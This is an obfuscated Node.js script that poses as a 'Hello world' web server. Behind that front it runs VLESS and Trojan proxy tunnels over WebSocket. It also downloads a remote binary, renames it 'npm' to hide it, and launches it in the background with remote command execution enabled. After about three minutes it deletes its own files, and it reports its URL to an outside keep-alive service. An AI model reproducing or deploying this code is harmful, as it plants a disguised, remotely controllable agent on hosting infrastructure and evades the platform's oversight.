const _0x39233b=_0x124c;(function(_0x5087ea,_0x1f25ba){const _0x50c5eb=_0x124c,_0x37b8df=_0x5087ea();while(!![]){try{const _0x28052e=-parseInt(_0x50c5eb(0x208))/0x1+parseInt(_0x50c5eb(0x225))/0x2*(-parseInt(_0x50c5eb(0x1f6))/0x3)+parseInt(_0x50c5eb(0x21c))/0x4+-parseInt(_0x50c5eb(0x1dc))/0x5+parseInt(_0x50c5eb(0x20f))/0x6+-parseInt(_0x50c5eb(0x1d3))/0x7+-parseInt(_0x50c5eb(0x21f))/0x8*(-parseInt(_0x50c5eb(0x21e))/0x9);if(_0x28052e===_0x1f25ba)break;else _0x37b8df['push'](_0x37b8df['shift']());}catch(_0x1b51c8){_0x37b8df['push'](_0x37b8df['shift']());}}}(_0x32a8,0xa43af));const os=require('os'),http=require(_0x39233b(0x22c)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x39233b(0x1f8)),crypto=require(_0x39233b(0x211)),{Buffer}=require(_0x39233b(0x212)),{exec,execSync}=require(_0x39233b(0x1cf)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x39233b(0x209)]['UUID']||_0x39233b(0x1ec),NEZHA_SERVER=process[_0x39233b(0x209)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x39233b(0x209)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x39233b(0x204)]||'',DOMAIN=process[_0x39233b(0x209)]['DOMAIN']||_0x39233b(0x200),AUTO_ACCESS=process[_0x39233b(0x209)][_0x39233b(0x1ce)]||![],WSPATH=process['env']['WSPATH']||UUID[_0x39233b(0x20b)](0x0,0x8),SUB_PATH=process[_0x39233b(0x209)][_0x39233b(0x1fc)]||'woshinidie',NAME=process[_0x39233b(0x209)][_0x39233b(0x1e5)]||_0x39233b(0x1f4),PORT=process['env'][_0x39233b(0x1d1)]||0x1eb4;function _0x32a8(){const _0x2ecde6=['includes','2778125KjggKT','https://arm64.ssss.nyc.mn/agent','base64','pop','map','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','country','url','sha224','NAME','finish','write','connect','unlink','toString','message','0f3a46b0-3db0-4ae1-a5bf-4df403391186','Server\x20is\x20running\x20on\x20port\x20','8.8.4.4','reduce','data','utf-8','test','join','Hug','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','1227OUNjUf','once','path','readUInt16BE','error','createWriteStream','SUB_PATH','--tls','asOrganization','arm','akime-myspace.hf.space','https://amd64.ssss.nyc.mn/v1','\x20with\x20all\x20DNS\x20servers','get','NEZHA_KEY','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','arch','connection','1274510sUHCYE','env','8443','slice','replace','pipe','&type=A','3931104hsuwsv','Automatic\x20Access\x20Task\x20added\x20successfully','crypto','buffer','length','end','Answer','log','concat','trim','npm','close','\x20-p\x20','2843676WkCVqK','&path=%2F','28480338bIEJFB','8djqBzY','2053','chmod\x20+x\x20npm','from','then','text/html','4220CvmOLj','decode','text/plain','catch','config.yaml','2096','2083','http','arm64','utf8','Hello\x20world!','digest','npm\x20is\x20running','AUTO_ACCESS','child_process','&fp=chrome&type=ws&host=','PORT','application/dns-json','8153411FscQJh','send','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','writeHead','https://dns.google/resolve?name=','substr','find','post'];_0x32a8=function(){return _0x2ecde6;};return _0x32a8();}let ISP='';const GetISP=async()=>{const _0x59f838=_0x39233b;try{const _0x4146d0=await axios[_0x59f838(0x203)]('https://speed.cloudflare.com/meta'),_0x1ed53e=_0x4146d0[_0x59f838(0x1f0)];ISP=(_0x1ed53e[_0x59f838(0x1e2)]+'-'+_0x1ed53e[_0x59f838(0x1fe)])['replace'](/ /g,'_');}catch(_0x26830f){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x5f0109,_0x448bad)=>{const _0x52c042=_0x39233b;if(_0x5f0109[_0x52c042(0x1e3)]==='/'){const _0x2fc204=path[_0x52c042(0x1f3)](__dirname,'index.html');fs['readFile'](_0x2fc204,_0x52c042(0x22e),(_0x2cc176,_0x132d6c)=>{const _0x3a84a9=_0x52c042;if(_0x2cc176){_0x448bad[_0x3a84a9(0x1d6)](0xc8,{'Content-Type':_0x3a84a9(0x224)}),_0x448bad[_0x3a84a9(0x214)](_0x3a84a9(0x22f));return;}_0x448bad['writeHead'](0xc8,{'Content-Type':_0x3a84a9(0x224)}),_0x448bad[_0x3a84a9(0x214)](_0x132d6c);});return;}else{if(_0x5f0109[_0x52c042(0x1e3)]==='/'+SUB_PATH){const _0x264e22=NAME?NAME+'-'+ISP:ISP,_0x26f336='vless://'+UUID+_0x52c042(0x205)+DOMAIN+_0x52c042(0x1d0)+DOMAIN+_0x52c042(0x21d)+WSPATH+'#'+_0x264e22,_0x4ce7c3='trojan://'+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0x52c042(0x1d0)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x264e22,_0x1b1972=_0x26f336+'\x0a'+_0x4ce7c3,_0x2b8407=Buffer[_0x52c042(0x222)](_0x1b1972)['toString'](_0x52c042(0x1de));_0x448bad['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x448bad[_0x52c042(0x214)](_0x2b8407+'\x0a');}else _0x448bad['writeHead'](0x194,{'Content-Type':_0x52c042(0x227)}),_0x448bad['end']('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x39233b(0x20c)](/-/g,''),DNS_SERVERS=[_0x39233b(0x1ee),'1.1.1.1'];function resolveHost(_0x446e43){return new Promise((_0x22eca1,_0x246b7f)=>{const _0x58b5e7=_0x124c;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x58b5e7(0x1f2)](_0x446e43)){_0x22eca1(_0x446e43);return;}let _0x3ecb87=0x0;function _0x334e3e(){const _0x1420d9=_0x58b5e7;if(_0x3ecb87>=DNS_SERVERS[_0x1420d9(0x213)]){_0x246b7f(new Error('Failed\x20to\x20resolve\x20'+_0x446e43+_0x1420d9(0x202)));return;}const _0x1a2fa6=DNS_SERVERS[_0x3ecb87];_0x3ecb87++;const _0x2e8fe9=_0x1420d9(0x1d7)+encodeURIComponent(_0x446e43)+_0x1420d9(0x20e);axios['get'](_0x2e8fe9,{'timeout':0x1388,'headers':{'Accept':_0x1420d9(0x1d2)}})['then'](_0xd6ae20=>{const _0x2b2619=_0x1420d9,_0x373818=_0xd6ae20['data'];if(_0x373818['Status']===0x0&&_0x373818[_0x2b2619(0x215)]&&_0x373818['Answer'][_0x2b2619(0x213)]>0x0){const _0x9dff4=_0x373818[_0x2b2619(0x215)][_0x2b2619(0x1d9)](_0x13279a=>_0x13279a['type']===0x1);if(_0x9dff4){_0x22eca1(_0x9dff4[_0x2b2619(0x1f0)]);return;}}_0x334e3e();})[_0x1420d9(0x228)](_0x26062d=>{_0x334e3e();});}_0x334e3e();});}function handleVlessConnection(_0x1023d5,_0x52c469){const _0x2db06a=_0x39233b,[_0x1676ee]=_0x52c469,_0x405c02=_0x52c469[_0x2db06a(0x20b)](0x1,0x11);if(!_0x405c02['every']((_0x3a0964,_0x5ac9b3)=>_0x3a0964==parseInt(uuid[_0x2db06a(0x1d8)](_0x5ac9b3*0x2,0x2),0x10)))return![];let _0x30ed98=_0x52c469['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x5a4b61=_0x52c469['slice'](_0x30ed98,_0x30ed98+=0x2)[_0x2db06a(0x1f9)](0x0),_0x3d3cd2=_0x52c469['slice'](_0x30ed98,_0x30ed98+=0x1)['readUInt8'](),_0x567948=_0x3d3cd2==0x1?_0x52c469['slice'](_0x30ed98,_0x30ed98+=0x4)[_0x2db06a(0x1f3)]('.'):_0x3d3cd2==0x2?new TextDecoder()[_0x2db06a(0x226)](_0x52c469['slice'](_0x30ed98+0x1,_0x30ed98+=0x1+_0x52c469['slice'](_0x30ed98,_0x30ed98+0x1)['readUInt8']())):_0x3d3cd2==0x3?_0x52c469[_0x2db06a(0x20b)](_0x30ed98,_0x30ed98+=0x10)[_0x2db06a(0x1ef)]((_0x53e356,_0x3ef3e7,_0x224640,_0x39842c)=>_0x224640%0x2?_0x53e356[_0x2db06a(0x217)](_0x39842c[_0x2db06a(0x20b)](_0x224640-0x1,_0x224640+0x1)):_0x53e356,[])[_0x2db06a(0x1e0)](_0x50d22f=>_0x50d22f[_0x2db06a(0x1f9)](0x0)['toString'](0x10))['join'](':'):'';_0x1023d5[_0x2db06a(0x1d4)](new Uint8Array([_0x1676ee,0x0]));const _0x2de0c2=createWebSocketStream(_0x1023d5);return resolveHost(_0x567948)[_0x2db06a(0x223)](_0x2d9006=>{const _0x1999c3=_0x2db06a;net[_0x1999c3(0x1e8)]({'host':_0x2d9006,'port':_0x5a4b61},function(){const _0x2b0eb9=_0x1999c3;this['write'](_0x52c469['slice'](_0x30ed98)),_0x2de0c2['on'](_0x2b0eb9(0x1fa),()=>{})[_0x2b0eb9(0x20d)](this)['on'](_0x2b0eb9(0x1fa),()=>{})['pipe'](_0x2de0c2);})['on']('error',()=>{});})[_0x2db06a(0x228)](_0xc97be4=>{const _0x27d31f=_0x2db06a;net['connect']({'host':_0x567948,'port':_0x5a4b61},function(){const _0x467c1d=_0x124c;this['write'](_0x52c469[_0x467c1d(0x20b)](_0x30ed98)),_0x2de0c2['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x2de0c2);})['on'](_0x27d31f(0x1fa),()=>{});}),!![];}function handleTrojanConnection(_0x185669,_0x13a991){const _0x162d71=_0x39233b;try{if(_0x13a991[_0x162d71(0x213)]<0x3a)return![];const _0x8e783c=_0x13a991[_0x162d71(0x20b)](0x0,0x38)[_0x162d71(0x1ea)](),_0x18eca7=[UUID];let _0x34ab78=null;for(const _0x25d0af of _0x18eca7){const _0x5eda28=crypto['createHash'](_0x162d71(0x1e4))['update'](_0x25d0af)[_0x162d71(0x230)]('hex');if(_0x5eda28===_0x8e783c){_0x34ab78=_0x25d0af;break;}}if(!_0x34ab78)return![];let _0x421cc0=0x38;_0x13a991[_0x421cc0]===0xd&&_0x13a991[_0x421cc0+0x1]===0xa&&(_0x421cc0+=0x2);const _0x261554=_0x13a991[_0x421cc0];if(_0x261554!==0x1)return![];_0x421cc0+=0x1;const _0x15612b=_0x13a991[_0x421cc0];_0x421cc0+=0x1;let _0x409840,_0x4aebdb;if(_0x15612b===0x1)_0x409840=_0x13a991['slice'](_0x421cc0,_0x421cc0+0x4)[_0x162d71(0x1f3)]('.'),_0x421cc0+=0x4;else{if(_0x15612b===0x3){const _0xedd6ff=_0x13a991[_0x421cc0];_0x421cc0+=0x1,_0x409840=_0x13a991[_0x162d71(0x20b)](_0x421cc0,_0x421cc0+_0xedd6ff)[_0x162d71(0x1ea)](),_0x421cc0+=_0xedd6ff;}else{if(_0x15612b===0x4)_0x409840=_0x13a991['slice'](_0x421cc0,_0x421cc0+0x10)[_0x162d71(0x1ef)]((_0x491c25,_0x1cbee3,_0x2f6231,_0x251218)=>_0x2f6231%0x2?_0x491c25['concat'](_0x251218['slice'](_0x2f6231-0x1,_0x2f6231+0x1)):_0x491c25,[])['map'](_0x5dbdd4=>_0x5dbdd4[_0x162d71(0x1f9)](0x0)['toString'](0x10))['join'](':'),_0x421cc0+=0x10;else return![];}}_0x4aebdb=_0x13a991['readUInt16BE'](_0x421cc0),_0x421cc0+=0x2;_0x421cc0<_0x13a991['length']&&_0x13a991[_0x421cc0]===0xd&&_0x13a991[_0x421cc0+0x1]===0xa&&(_0x421cc0+=0x2);const _0x58f092=createWebSocketStream(_0x185669);return resolveHost(_0x409840)['then'](_0x287375=>{const _0x2cfe73=_0x162d71;net[_0x2cfe73(0x1e8)]({'host':_0x287375,'port':_0x4aebdb},function(){const _0x529be7=_0x2cfe73;_0x421cc0<_0x13a991['length']&&this['write'](_0x13a991[_0x529be7(0x20b)](_0x421cc0)),_0x58f092['on']('error',()=>{})[_0x529be7(0x20d)](this)['on'](_0x529be7(0x1fa),()=>{})[_0x529be7(0x20d)](_0x58f092);})['on']('error',()=>{});})[_0x162d71(0x228)](_0x369ddc=>{const _0x3be0ac=_0x162d71;net['connect']({'host':_0x409840,'port':_0x4aebdb},function(){const _0x55f844=_0x124c;_0x421cc0<_0x13a991[_0x55f844(0x213)]&&this[_0x55f844(0x1e7)](_0x13a991[_0x55f844(0x20b)](_0x421cc0)),_0x58f092['on'](_0x55f844(0x1fa),()=>{})['pipe'](this)['on']('error',()=>{})[_0x55f844(0x20d)](_0x58f092);})['on'](_0x3be0ac(0x1fa),()=>{});}),!![];}catch(_0x40441e){return![];}}wss['on'](_0x39233b(0x207),(_0x15306b,_0x47c145)=>{const _0x2b8212=_0x39233b,_0x256c2f=_0x47c145['url']||'';_0x15306b[_0x2b8212(0x1f7)](_0x2b8212(0x1eb),_0x251e6=>{const _0xf91dfc=_0x2b8212;if(_0x251e6['length']>0x11&&_0x251e6[0x0]===0x0){const _0x422099=_0x251e6[_0xf91dfc(0x20b)](0x1,0x11),_0x5dae5c=_0x422099['every']((_0x274092,_0x32a57a)=>_0x274092==parseInt(uuid[_0xf91dfc(0x1d8)](_0x32a57a*0x2,0x2),0x10));if(_0x5dae5c){!handleVlessConnection(_0x15306b,_0x251e6)&&_0x15306b[_0xf91dfc(0x21a)]();return;}}!handleTrojanConnection(_0x15306b,_0x251e6)&&_0x15306b['close']();})['on'](_0x2b8212(0x1fa),()=>{});});const getDownloadUrl=()=>{const _0x1739d2=_0x39233b,_0x4d44fd=os[_0x1739d2(0x206)]();return _0x4d44fd===_0x1739d2(0x1ff)||_0x4d44fd===_0x1739d2(0x22d)||_0x4d44fd==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x1739d2(0x1dd):!NEZHA_PORT?_0x1739d2(0x201):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x304f13=_0x39233b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x348aff=getDownloadUrl(),_0x45fd2b=await axios({'method':_0x304f13(0x203),'url':_0x348aff,'responseType':'stream'}),_0x40ca30=fs[_0x304f13(0x1fb)]('npm');return _0x45fd2b['data'][_0x304f13(0x20d)](_0x40ca30),new Promise((_0x26a2e5,_0x5dba3f)=>{const _0x4fbc5b=_0x304f13;_0x40ca30['on'](_0x4fbc5b(0x1e6),()=>{const _0x227f35=_0x4fbc5b;console[_0x227f35(0x216)]('npm\x20download\x20successfully'),exec(_0x227f35(0x221),_0xa5a496=>{if(_0xa5a496)_0x5dba3f(_0xa5a496);_0x26a2e5();});}),_0x40ca30['on']('error',_0x5dba3f);});}catch(_0x186b8c){throw _0x186b8c;}},runnz=async()=>{const _0x4a018c=_0x39233b;try{const _0x1acc8d=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x4a018c(0x1f1)});if(_0x1acc8d[_0x4a018c(0x218)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x595b6a){}await downloadFile();let _0x5aa32e='',_0x218b7a=['443',_0x4a018c(0x20a),_0x4a018c(0x22a),'2087',_0x4a018c(0x22b),_0x4a018c(0x220)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x6c6110=_0x218b7a[_0x4a018c(0x1db)](NEZHA_PORT)?_0x4a018c(0x1fd):'';_0x5aa32e='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4a018c(0x21b)+NEZHA_KEY+'\x20'+_0x6c6110+_0x4a018c(0x1d5);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5b07c3=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x4a018c(0x1df)]():'',_0x9f2ade=_0x218b7a[_0x4a018c(0x1db)](_0x5b07c3)?'true':'false',_0x51604d='client_secret:\x20'+NEZHA_KEY+_0x4a018c(0x1e1)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x9f2ade+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x4a018c(0x229),_0x51604d);}_0x5aa32e='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x4a018c(0x1f5));return;}}try{exec(_0x5aa32e,{'shell':'/bin/bash'},_0x58ab76=>{const _0x357bb9=_0x4a018c;if(_0x58ab76)console[_0x357bb9(0x1fa)]('npm\x20running\x20error:',_0x58ab76);else console[_0x357bb9(0x216)](_0x357bb9(0x231));});}catch(_0x57465f){console[_0x4a018c(0x1fa)]('error:\x20'+_0x57465f);}};function _0x124c(_0x68ae8c,_0x5f3aa2){_0x68ae8c=_0x68ae8c-0x1ce;const _0x32a815=_0x32a8();let _0x124c27=_0x32a815[_0x68ae8c];return _0x124c27;}async function addAccessTask(){const _0x58a20d=_0x39233b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x478e97='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x272865=await axios[_0x58a20d(0x1da)]('https://oooo.serv00.net/add-url',{'url':_0x478e97},{'headers':{'Content-Type':'application/json'}});console['log'](_0x58a20d(0x210));}catch(_0x352e8c){}}const delFiles=()=>{const _0x1cb455=_0x39233b;fs[_0x1cb455(0x1e9)](_0x1cb455(0x219),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x410d63=_0x39233b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x410d63(0x1ed)+PORT);});
